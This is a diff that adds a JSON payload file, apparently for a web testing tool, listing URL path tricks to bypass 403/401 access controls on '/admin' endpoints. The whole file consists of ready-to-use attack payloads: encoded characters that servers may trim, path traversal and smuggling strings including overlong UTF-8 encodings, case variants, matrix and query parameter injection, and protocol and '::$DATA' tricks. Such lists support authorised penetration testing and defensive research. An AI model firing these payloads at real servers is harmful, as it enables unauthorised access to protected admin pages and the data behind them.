@@ -1,0 +1,125 @@
+{
+  "version": "1.0.0",
+  "description": "Path manipulation bypass techniques for 403/401 bypass",
+  "last_updated": "2023-07-20",
+  "techniques": [
+    {
+      "category": "trim_inconsistency",
+      "description": "URL encoded characters that might be trimmed inconsistently",
+      "payloads": [
+        "/%09/admin",
+        "/%0a/admin",
+        "/%0d/admin",
+        "/%00/admin",
+        "/%20/admin",
+        "/%2e/admin",
+        "/%2f/admin",
+        "/%5c/admin",
+        "/%25/admin",
+        "/%2a/admin",
+        "/%3f/admin",
+        "/%23/admin",
+        "/%81/admin",
+        "/%8a/admin",
+        "/%8d/admin",
+        "/%8f/admin",
+        "/%90/admin",
+        "/%9a/admin",
+        "/%9d/admin",
+        "/%9f/admin",
+        "/%a0/admin",
+        "/%ad/admin",
+        "/%be/admin",
+        "/%bf/admin",
+        "/%252e/admin",
+        "/%252f/admin",
+        "/%255c/admin",
+        "/%u002e/admin",
+        "/%u002f/admin",
+        "/%u005c/admin",
+        "/%uff0e/admin",
+        "/%uff0f/admin",
+        "/%uff3c/admin"
+      ]
+    },
+    {
+      "category": "path_smuggling",
+      "description": "Path traversal and smuggling techniques",
+      "payloads": [
+        "/..%2fadmin",
+        "/.%2e/admin",
+        "/..;/admin",
+        "/.;/admin",
+        "/..\\admin",
+        "/.%2e%2fadmin",
+        "/%2e%2e%2fadmin",
+        "/..%5cadmin",
+        "/.%2e%5cadmin",
+        "/%2e%2e%5cadmin",
+        "/..%255cadmin",
+        "/.%32%65/admin",
+        "/..%32%65/admin",
+        "/..%35%63/admin",
+        "/..%c0%afadmin",
+        "/..%c1%9cadmin"
+      ]
+    },
+    {
+      "category": "case_manipulation",
+      "description": "Case manipulation techniques for case-sensitive systems",
+      "payloads": [
+        "/ADMIN",
+        "/Admin",
+        "/aDmIn",
+        "/admin/..%2fADMIN",
+        "/admin/..%2fAdmin",
+        "/admin/..%2faDmIn",
+        "/%41%44%4d%49%4e",  
+        "/%61%64%6d%69%6e", 
+        "/admin.%48%54%4d",  
+        "/admin.%68%74%6d",   
+        "/admin.%48%54%4d%4c",
+        "/admin.%68%74%6d%6c" 
+      ]
+    },
+    {
+      "category": "parameter_injection",
+      "description": "Matrix parameter and query string injection",
+      "payloads": [
+        "/admin;bypass=true",
+        "/admin;redirect=..",
+        "/admin;.html",
+        "/admin;.php",
+        "/admin;.jsp",
+        "/admin;.asp",
+        "/admin;.aspx",
+        "/admin?.html",
+        "/admin?.php",
+        "/admin?.jsp",
+        "/admin?.asp",
+        "/admin?.aspx",
+        "/admin#bypass",
+        "/admin#",
+        "/admin/*",
+        "/admin/*/",
+        "/admin/."
+      ]
+    },
+    {
+      "category": "protocol_switching",
+      "description": "Protocol switching techniques",
+      "payloads": [
+        "/http:/admin",
+        "/https:/admin",
+        "/ftp:/admin",
+        "/file:/admin",
+        "/http://admin",
+        "/https://admin",
+        "/ftp://admin",
+        "/file://admin",
+        "/admin::DATA",
+        "/admin::$DATA"
+      ]
+    }
+  ]
+}
